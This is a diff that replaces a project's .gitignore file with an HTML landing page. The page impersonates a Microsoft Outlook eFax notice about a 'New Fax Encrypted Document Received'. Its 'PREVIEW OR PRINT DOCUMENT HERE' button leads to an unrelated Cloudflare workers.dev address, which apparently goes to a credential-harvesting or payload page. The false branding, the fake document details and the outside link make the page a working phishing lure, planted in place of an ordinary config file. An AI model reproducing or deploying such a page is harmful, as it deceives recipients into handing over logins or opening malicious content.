@@ -1,18 +1,226 @@
-# Build and Release Folders
-bin-debug/
-bin-release/
-[Oo]bj/
-[Bb]in/
 
-# Other files and folders
-.settings/
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>[1]eFax928js</title>
+    <meta name="description" content="[1]eFax928" />
+    <link rel="icon" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta property="og:title" content="[1]eFax928js" />
+    <meta property="og:description" content="[1]eFax928" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <script type="text/javascript"></script>
+    <link
+      href="https://fonts.googleapis.com/css?family=DM+Sans:400|Inter:700,700,700,600,600,600&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdn.dorik.com/60dc9a6519777c001197e252/css/index.css?v=e50326941c3411098e709264f9bf770b79f17812"
+    />
 
-# Executables
-*.swf
-*.air
-*.ipa
-*.apk
+    <script
+      async
+      src="https://www.googletagmanager.com/gtag/js?id=UA-162484944-4"
+    ></script>
+    <script type="text/javascript">
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "UA-162484944-4");
+    </script>
+  </head>
+  <body>
+    <section class="dorik-section dorik-section-zfpp1rw3 ">
+      <div class="dorik-section-zfpp1rw3-frame-corner dorik-frame-corner"></div>
+      <div class="container">
+        <div class="dorik-row-wem1n9st  flex">
+          <div class="col-lg-1/1 ">
+            <div class="column-inner dorik-column-hv3m6m73  1/1">
+              <div class="dorik-navbar--wrapper dorik-nav-wvhdxqfs-wrapper ">
+                <div class="dorik-navbar dorik-nav-wvhdxqfs ">
+                  <div class="dorik-navbar--brand">
+                    <a href="#"
+                      ><img
+                        src="https://cdn.dorik.com/5e373b6c43a72a001f56dbf6/images/logo-white_dhnz5o9o.svg"
+                        width="70px"
+                    /></a>
+                  </div>
+                  <button
+                    class="dorik-navbar--toggle"
+                    data-target="#dorikNavbarCollapse"
+                  >
+                    <svg
+                      aria-hidden="true"
+                      focusable="false"
+                      data-prefix="fas"
+                      data-icon="bars"
+                      class="svg-inline--fa fa-bars fa-w-14 fa-fw "
+                      role="img"
+                      xmlns="http://www.w3.org/2000/svg"
+                      viewBox="0 0 448 512"
+                    >
+                      <path
+                        fill="currentColor"
+                        d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"
+                      ></path>
+                    </svg>
+                  </button>
+                  <div
+                    class="dorik-navbar--collapse collapse"
+                    id="dorikNavbarCollapse"
+                  >
+                    <div class="dorik-navbar--navs">
+                      <ul class="dorik-nav--links normalize">
+                        <li>
+                          <a href="#features" class="dorik-nav--link features"
+                            ><span class="dorik-nav--link-text"
+                              >Features</span
+                            ></a
+                          >
+                        </li>
+                        <li>
+                          <a href="#pricing" class="dorik-nav--link pricing"
+                            ><span class="dorik-nav--link-text"
+                              >Pricing</span
+                            ></a
+                          >
+                        </li>
+                        <li>
+                          <a
+                            href="#testimonials"
+                            class="dorik-nav--link testimonials"
+                            ><span class="dorik-nav--link-text"
+                              >Testimonials</span
+                            ></a
+                          >
+                        </li>
+                      </ul>
+                      <ul class="dorik-nav--btns normalize">
+                        <li>
+                          <a
+                            href="#"
+                            class="dorik-nav--btn dorik-nav--btn-a9h97xdg get-started"
+                            ><span class="dorik-nav--btn-text"
+                              >Get Started!</span
+                            ></a
+                          >
+                        </li>
+                      </ul>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="container">
+        <div class="dorik-row-84c2gcb9  flex">
+          <div class="col-lg-1/2 ">
+            <div class="column-inner dorik-column-tbqzqi7f  1/2">
+              <div class="dorik-button-t1nu1k3n-wrapper  ">
+                <button class="dorik-btn dorik-button-t1nu1k3n ">
+                  (1) New Fax Encrypted Document Received
+                </button>
+              </div>
+              <h4
+                class="dorik-heading dorik-heading-irceu4kf  dorik-heading-irceu4kf-wrapper "
+              >
+                <span
+                  ><p>Preview or Read Your Document Below</p>
+                  <p></p>
+                  <p></p>
+                </span>
+              </h4>
+              <div class="dorik-text dorik-text-dc0f6nza ">
+                <p>📧</p>
+                <p></p>
+                <p>You have been granted access to a secured document file</p>
+                <p>*Date/Time: Thursday, July 06, 2021</p>
+                <p></p>
+                <p>* Reference: 001108</p>
+                <p></p>
+                <p>*Pages: 3&nbsp;</p>
+              </div>
+              <div class="dorik-button-atc25dbw-wrapper  ">
+                <a
+                  class="dorik-btn dorik-button-atc25dbw "
+                  href="https://fragrant-wave-439a.pofep73926-sevet.workers.dev/"
+                  >PREVIEW OR PRINT DOCUMENT HERE</a
+                >
+              </div>
+              <div class="dorik-text dorik-text-41xguswx ">
+                <p>
+                  All Rights Reserved Microsoft Outlook eFax Inc. © 2021
+                  Microsoft
+                </p>
+                <p></p>
+              </div>
+            </div>
+          </div>
+          <div class="col-lg-1/2 ">
+            <div class="column-inner dorik-column-ry90whvp  1/2"></div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <script>
+      window.DORIK_PROJECT_ID = "60dc9a6519777c001197e252";
+    </script>
+    <script src="https://assets.dorik.io/shared/jquery-3.5.1.min.js"></script>
+    <script type="text/javascript">
+      (function() {
+        const navbar = document.querySelector(".dorik-nav-wvhdxqfs");
+        (function toggleNav(el) {
+          const toggleBtn = el.querySelector(".dorik-navbar--toggle");
+          toggleBtn &&
+            toggleBtn.addEventListener("click", function(e) {
+              const navlist = toggleBtn.nextElementSibling;
+              const hasShow = navlist.classList.contains("show");
 
-# Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`
-# should NOT be excluded as they contain compiler settings and other important
-# information for Eclipse / Flash Builder.
+              if (!hasShow) {
+                expend();
+              } else {
+                collapse();
+              }
+
+              navlist.addEventListener("click", function(e) {
+                if (e.target.closest("a")) {
+                  collapse();
+                }
+              });
+
+              function expend() {
+                navlist.classList.add("show");
+                const height = navlist.clientHeight + "px";
+                navlist.classList.add("collapsing");
+                setTimeout(() => {
+                  navlist.style.height = height;
+                }, 0);
+                setTimeout(() => {
+                  navlist.style.height = null;
+                  navlist.classList.remove("collapsing");
+                }, 350);
+              }
+
+              function collapse() {
+                navlist.style.height = navlist.clientHeight + "px";
+                navlist.classList.add("collapsing");
+                setTimeout(() => {
+                  navlist.style.height = null;
+                }, 0);
+                setTimeout(() => {
+                  navlist.classList.remove("show");
+                  navlist.classList.remove("collapsing");
+                }, 350);
+              }
+            });
+        })(navbar);
+      })();
+    </script>
+  </body>
+</html>
